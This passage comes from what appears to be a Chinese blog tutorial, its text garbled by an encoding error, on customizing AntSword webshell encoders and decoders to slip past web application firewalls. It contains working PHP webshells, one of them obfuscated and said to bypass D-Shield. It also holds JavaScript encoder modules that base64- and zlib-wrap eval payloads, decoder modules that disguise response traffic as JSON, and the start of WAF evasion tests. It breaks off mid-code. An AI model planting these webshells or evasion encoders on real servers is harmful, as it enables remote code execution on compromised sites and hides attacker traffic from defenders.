payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line">  <span class="comment">// ä»¥ä¸‹ä»£ç ä¸º PHP Base64 æ ·ä¾‹</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç”Ÿæˆä¸€ä¸ªéšæœºå˜é‡å</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// åŸæœ‰çš„ payload åœ¨ data[&#x27;_&#x27;]ä¸­</span></span><br><span class="line">  <span class="comment">// å–å‡ºæ¥ä¹‹åï¼Œè½¬ä¸º base64 ç¼–ç å¹¶æ”¾å…¥ randomID key ä¸‹</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œå…ˆå¤„ç† pwd å‚æ•°ä¸‹çš„å†…å®¹ï¼Œ</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pwdä¸ºå¯†ç ï¼Œdataä¸ºç¼–ç å™¨å¤„ç†å‰çš„payloadæ•°ç»„ï¼Œè¿™é‡Œæ˜¯æ•°ç»„ï¼Œ</p><p><img src="/images/antsword-bypasswaf/image-20240301140159287.png" alt="image-20240301140159287"></p><p><img src="/images/antsword-bypasswaf/image-20240301140209040.png" alt="image-20240301140209040"></p><p>ç”¨æµé‡çœ‹ä¸€ä¸‹ï¼Œå¯†ç ä¸ºaï¼Œa=eval(base64_decode(%24_POST%5B_0xc1c4783e9a6cf%5D))%3Bï¼Œè‡ªå·±é€ äº†ä¸€ä¸ªrandomIDï¼Œç„¶åä¼ é€’è¿™ä¸ªidçš„å€¼ï¼Œbase64è§£ç ï¼Œè¿™æ ·å°±æŠŠåŸæ¥çš„payloadï¼Œå°±æ˜¯@ini_set(â€œdisplay_errorsâ€, â€œ0â€);@set_time_limit(0);$opdir=@ini_get(â€œopen_basedirâ€);if($opdir) å¼€å¤´çš„ä¸€å¤§ä¸²ç»™base64æ‰äº†ï¼Œå°±ä¸ä¼šæ£€æµ‹åˆ°äº†ã€‚è€Œvalueå’Œdetailè¿™äº›å‚æ•°è¿˜æ˜¯åœ¨payloadä¸­ï¼Œ</p><p><img src="/images/antsword-bypasswaf/image-20240301140732128.png" alt="image-20240301140732128"></p><p>å°±è¿˜æ˜¯éœ€è¦æ“ä½œçš„ã€‚</p><p>ç¬”è€…è¿™é‡Œç”¨ä¸€ä¸ªç½‘ä¸Šå­¦æ¥çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::zlib_deflated_raw ç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2019/01/12 00:05:44</span></span><br><span class="line"><span class="comment"> * zlib å‹ç¼© payload, é€‚é… shell è§ä»£ç å¤„</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  ext.opts.httpConf.headers[<span class="string">&#x27;User-Agent&#x27;</span>]=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>;</span><br><span class="line">   <span class="comment">//è®¾ç½®ua</span></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸‹æ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`ceshi`</span>;</span><br><span class="line">  data[randomID] = zlib.deflateRawSync(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="comment">// è‹±è¯­å•è¯åˆ—è¡¨</span></span><br><span class="line">  <span class="comment">// const wordList = [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;car&#x27;, &#x27;dog&#x27;, &#x27;elephant&#x27;, &#x27;flower&#x27;];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // ç”Ÿæˆä¸€ä¸ªéšæœºç´¢å¼•</span></span><br><span class="line">  <span class="comment">// const randomIndex = randomInt(0, wordList.length - 1);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // è·å–éšæœºå•è¯</span></span><br><span class="line">  <span class="comment">// const randomWord = wordList[randomIndex];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // åœ¨è°ƒç”¨æ¨¡å—ä¹‹å‰ï¼Œå°†éšæœºå•è¯æ·»åŠ åˆ° data å¯¹è±¡ä¸­</span></span><br><span class="line">  <span class="comment">// data[&#x27;123&#x27;] = randomWord;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è°ƒç”¨æ¨¡å—å¹¶ä¼ å…¥ data å¯¹è±¡</span></span><br><span class="line"><span class="comment">// å¤„ç†è¿”å›çš„ç»“æœ</span></span><br><span class="line"><span class="comment">// è¿™é‡Œçš„ processedData å³ä¸ºå¤„ç†åçš„ payload æ•°æ®</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// &lt;?php @eval($_POST[&#x27;ant&#x27;]);?&gt;</span></span><br><span class="line">  <span class="comment">//data[pwd] = `eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); ?&gt;</span></span><br><span class="line">  data[pwd] = zlib.deflateRawSync(<span class="string">`@eval(@gzinflate(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>])));`</span>).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); ?&gt;</span></span><br><span class="line">  <span class="comment">// data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€å°±æ˜¯æŠŠpwdä¼ çš„å‚æ•°å’Œrandomidç»™ç”¨zlibå‹ç¼©ä¸€ä¸‹ã€‚<br>è¿™é‡Œå†™å…¥webshellçš„æ—¶å€™æœ‰å°å°çš„å˜åŒ–ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(@gzinflate(base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">æ”¾ä¸€ä¸ªç®€å•è¿‡dç›¾çš„ï¼Œdç›¾é»˜è®¤æ˜¯ä¸èƒ½è®¿é—®ä¸‰çº§çš„è„šæœ¬ï¼Œè¿™ä¸ªæ˜¯äºŒçº§ï¼Œä»…ç”¨äºæµ‹è¯•ç”¨ã€‚</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$did</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;       <span class="keyword">$this</span>-&gt;id=<span class="string">&#x27;QGV2YWwoQGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYW50J10pKSk7&#x27;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;did = @base64_decode( <span class="keyword">$this</span>-&gt;id );</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">&quot;/*sasa123*/&quot;</span>.<span class="keyword">$this</span>-&gt;did.<span class="string">&quot;/*sd123*/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> x();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¼ å€¼çš„æ—¶å€™ä¼šæŠŠantçš„å€¼å’Œceshiçš„å€¼ç»™gzinflateå‹ç¼©ï¼Œè¿™æ ·å°±æ›´å®‰å…¨ä¸€ç‚¹ã€‚ä½†æ˜¯å…¶å®å…¶ä¸­çš„payload{$p=base64_decode(substr($_POST[â€œdetailâ€],2));$s=base64_decode(substr($_POST[â€œvalueâ€],2));$envstr=@base64_decode(substr($_POST[â€œactionâ€],2)ä¸ä¼šå˜ï¼Œä¹Ÿå°±æ˜¯è¿˜æ˜¯base64ï¼Œ<br><img src="/images/antsword-bypasswaf/image-20240301142424590.png" alt="image-20240301142424590"></p><p>è¿™ä¸ªY21kç»å¸¸è¢«åŒ¹é…åˆ°ï¼Œä»–æ˜¯cmdçš„base64ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è§£å¯†å‹ç¼©æµé‡</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="string">&quot;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD%2FAPDolOTi3OyIzV1NS0BgA%3D&quot;</span>; <span class="comment">// è¿™é‡Œæ›¿æ¢æˆä½ è¦è§£å¯†çš„å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…ˆå¯¹åŠ å¯†è¿‡çš„å­—ç¬¦ä¸²è¿›è¡Œ base64 è§£ç </span></span><br><span class="line"><span class="comment">//echo $encrypted;</span></span><br><span class="line"><span class="variable">$encrypted</span> = urldecode(<span class="variable">$encrypted</span>);</span><br><span class="line"><span class="variable">$decoded</span> = base64_decode(<span class="variable">$encrypted</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç„¶åå¯¹è§£ç åçš„å­—ç¬¦ä¸²è¿›è¡Œ gzinflate è§£å‹ç¼©</span></span><br><span class="line"><span class="variable">$uncompressed</span> = @gzinflate(<span class="variable">$decoded</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ€åå°†è§£å‹ç¼©åçš„å­—ç¬¦ä¸²è¾“å‡º</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$uncompressed</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240301142614372.png" alt="image-20240301142614372"></p><p>å½“ç„¶æ— è®ºæ€ä¹ˆå‹ç¼©ï¼Œä¸ä¼šå¯¹å¯¹æŠ—äººå·¥å®¡æŸ¥æœ‰å¤§çš„æ•ˆæœï¼Œåªä¼šè€—æ—¶é—´ï¼Œå› ä¸ºçŸ¥é“äº†wenshellï¼Œä¹Ÿå°±çŸ¥é“äº†å¯†ç çš„è§£å¯†æ–¹å¼ï¼ŒçŸ¥é“äº†å¯†ç çš„è§£å¯†æ–¹å¼ï¼Œå°±çŸ¥é“payloadçš„è§£å¯†æ–¹å¼ï¼Œéšå³å°±çŸ¥é“äº†ï¼ŒåŠŸèƒ½ä¼ é€’çš„å‚æ•°è§£å¯†çš„æ–¹å¼ã€‚æˆ–è®¸å¯¹æŠ—äººå·¥æœ‰ä¸€ä¸¢ä¸¢ç”¨ã€‚<br>å…ˆåŸ‹ä¸ªå‘ï¼šå°†å‚æ•°ä¼ é€’çš„é”®æ”¹æ‰ã€‚</p><h6 id="3-3è§£ç å™¨"><a href="#3-3è§£ç å™¨" class="headerlink" title="3.3è§£ç å™¨"></a>3.3è§£ç å™¨</h6><p>è¿™é‡Œä¸€å®šè¦æ³¨æ„ç¼–ç å™¨ä¸è§£ç å™¨æ— å…³ï¼Œé™¤éä¸€ç§æƒ…å†µï¼Œå°±æ˜¯ä¼ é€’å‚æ•°çš„æ—¶å€™ï¼Œç›´æ¥æŠŠè¿”å›çš„ç»“æœè¿›è¡Œç¼–ç æˆ–åŠ å¯†ï¼Œè¿™æ ·è§£å¯†çš„æ—¶å€™å°±å’Œè§£ç ç›¸å…³äº†ã€‚<br>å…ˆæ¥çœ‹ä¸€ä¸‹ï¼Œè¿”å›ç»“æœä¸ç¼–ç ï¼Œå°±æ˜¯ä¼šç›´æ¥æŠŠç»“æœæ˜¾ç¤ºå‡ºæ¥ã€‚<br><img src="/images/antsword-bypasswaf/image-20240301152614725.png" alt="image-20240301152614725"></p><p>æ–°å»ºä¸€ä¸ªè§£ç å™¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64è§£ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/01 15:28:19</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span></span><br><span class="line"><span class="comment">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span></span><br><span class="line"><span class="comment">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">      return @base64_encode($out);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è§£ç  Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data è¦è¢«è§£ç çš„ Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>è§£ç åçš„ Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(data.toString(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç çš„è§£é‡Šå·²ç»å¾ˆè¯¦ç»†äº†ï¼Œ asoutput:ç»“æœæ˜¯è¿”å›æ•°æ®çš„base64ç¼–ç ï¼Œé‚£ä¸æ²¡æœ‰è¿™ä¸ªè§£ç å™¨ï¼Œ$outå°±æ˜¯è¿”å›ç»“æœfunction asenc($out){<br>      return @base64_encode($out);<br>    }</p><p>å°±æ˜¯base64ç¼–ç äº†ç»“æœï¼Œè¾“å‡ºçš„å€¼ã€‚<br>ä¸‹é¢decode_buffæ˜¯è§£ç çš„ç»“æœï¼Œè¿™ä¸ªdataå°±æ˜¯ä¸Šé¢base64ç¼–ç çš„ç»“æœï¼ŒBuffer.from(data.toString(), â€˜base64â€™);æ˜¯å°†è¿”å›çš„base64è§£ç ä¸€ä¸‹ï¼Œä¼ ç»™èšå‰‘çš„å®¢æˆ·ç«¯ï¼Œç„¶åæ˜¾ç¤ºåˆ°æˆ‘ä»¬çš„é¢å‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`cd /d &quot;$&#123;path&#125;&quot;&amp;$&#123;cmd&#125;&amp;echo $&#123;this.stag&#125;&amp;cd&amp;echo $&#123;this.etag&#125;` :</span><br></pre></td></tr></table></figure><p>åŸç‰ˆçš„modulesæ–‡ä»¶å¤¹ä¸‹çš„terminal.jsä¼šé»˜è®¤è¾“å‡ºthis.etagé—´éš”ç¬¦,<br><img src="/images/antsword-bypasswaf/image-20240301153914992.png" alt="image-20240301153914992"></p><p>å°±æ˜¯å‰ç¼€å’Œåç¼€ï¼ŒæŠŠå‰é¢å»æ‰å³å¯<br><img src="/images/antsword-bypasswaf/image-20240301154016699.png" alt="image-20240301154016699"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64è§£ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2020/05/22 10:21:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc å°†è¿”å›æ•°æ®base64ç¼–ç </span></span><br><span class="line"><span class="comment">   * è‡ªå®šä¹‰è¾“å‡ºå‡½æ•°åç§°å¿…é¡»ä¸º asenc</span></span><br><span class="line"><span class="comment">   * è¯¥å‡½æ•°ä½¿ç”¨çš„è¯­æ³•éœ€è¦å’Œshellä¿æŒä¸€è‡´</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">asoutput</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">       $a = base64_encode($out);</span></span><br><span class="line"><span class="string">        return &#x27;&#123;&quot;message&quot;:&quot;&#x27; .strrev($a) . &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * è§£ç  Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data è¦è¢«è§£ç çš„ Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>è§£ç åçš„ Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="attr">decode_buff</span>: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(data.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•å¯¹ç»“æœè¿›è¡Œæ“ä½œä¸€ä¸‹ï¼Œè¿™é‡Œå…ˆå°†outçš„å€¼è¿›è¡Œbase64ï¼Œç„¶åé€†åºä¸€ä¸‹ï¼Œè¿”å›çš„å€¼æ‹¼æ¥message,jsonçš„æ ¼å¼ï¼Œç»ˆç«¯æ‹¿åˆ°æ•°æ®ï¼Œè¦å…ˆåŒ¹é…messageï¼Œç„¶åé€†åºï¼Œæœ€åè§£ç å³å¯ã€‚<br>tipsï¼šè¿™é‡Œä¸€å®šè¦æ³¨æ„ï¼Œ asoutput: () =&gt; {é‡Œé¢çš„åå¼•å·ä¸ºphpçš„è¯­è¨€ï¼Œå¹¶ä¸æ˜¯notejsï¼Œè¿™é‡Œç ”ç©¶äº†å¥½é•¿æ—¶é—´ã€‚ä¸‹é¢çš„resæ˜¯notejsè¯­æ³•ã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240301155446538.png" alt="image-20240301155446538"></p><p>è¿™é‡Œå›æ˜¾åŒ…çš„å°±æ˜¯è¿™ä¸ªæ ·çš„ã€‚<br>çœ‹èµ·æ¥å¾ˆçªå…€ï¼Œå‰ç¼€åç¼€éƒ½æœ‰ã€‚<br>æˆ‘ä»¬ç»™ä»–å»æ‰ï¼Œåœ¨phpæ–‡ä»¶å¤¹ä¸‹çš„index.jsä¸­æœ‰å››ä¸ªåˆ†å‰²ç¬¦<br><img src="/images/antsword-bypasswaf/image-20240301155934647.png" alt="image-20240301155934647"></p><p>æˆ‘ä»¬éƒ½ç»™ä»–æ³¨é‡Šæ‰ï¼Œæ›¿æ¢ä¸ºç©ºã€‚é‡å¯å‘åŒ…<br><img src="/images/antsword-bypasswaf/image-20240301160012843.png" alt="image-20240301160012843"></p><p>è¿™æ ·å°±æœ‰é‚£å‘³äº†ã€‚<br>å› ä¸ºbase64çš„ç‰¹æ€§ï¼Œè¿™é‡Œè¿˜æ˜¯å¯ä»¥ä¸€çœ¼çœ‹å‡ºè¿™æ˜¯base64ï¼Œä¸¤ä¸ªç­‰äºå·ã€‚<br>è¿™é‡Œå€¼å¾—æ€è€ƒï¼Œè¿™æ ·å…¶å®å°±è¶³ä»¥åº”å¯¹wafæ£€æµ‹å›æ˜¾åŒ…äº†ï¼Œä½†æ˜¯äººå·¥æ£€æµ‹è¿˜æ˜¯ä¸è¡Œï¼Œä½†æ˜¯æ‰“æˆ˜çš„æ—¶å€™ï¼Œè‚¯å®šæ˜¯wafæ£€æµ‹ï¼Œæ‰€ä»¥åŠæ ¼å°±è¡Œï¼Œå…ˆåŸ‹ä¸ªå‘ã€‚<br>å½“ç„¶è§£å¯†è¿™ä¸ªæµé‡ä¹Ÿéå¸¸ç®€å•<br><img src="/images/antsword-bypasswaf/image-20240301160510507.png" alt="image-20240301160510507"></p><h5 id="4-waf-æµ‹è¯•"><a href="#4-waf-æµ‹è¯•" class="headerlink" title="4.waf æµ‹è¯•"></a>4.waf æµ‹è¯•</h5><h6 id="4-1bt-é›·æ± "><a href="#4-1bt-é›·æ± " class="headerlink" title="4.1bt+é›·æ± "></a>4.1bt+é›·æ± </h6><p>ç¬”è€…è¿™é‡Œæµ‹è¯•çš„éƒ½æ˜¯ï¼Œå‡è®¾æˆ‘ä»¬ä¸Šä¼ å¥½äº†webshellï¼Œçœ‹ä¸€ä¸‹wafä¼šä¸ä¼šæ‹¦æˆªæµé‡ã€‚<br>æœ¨é©¬ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 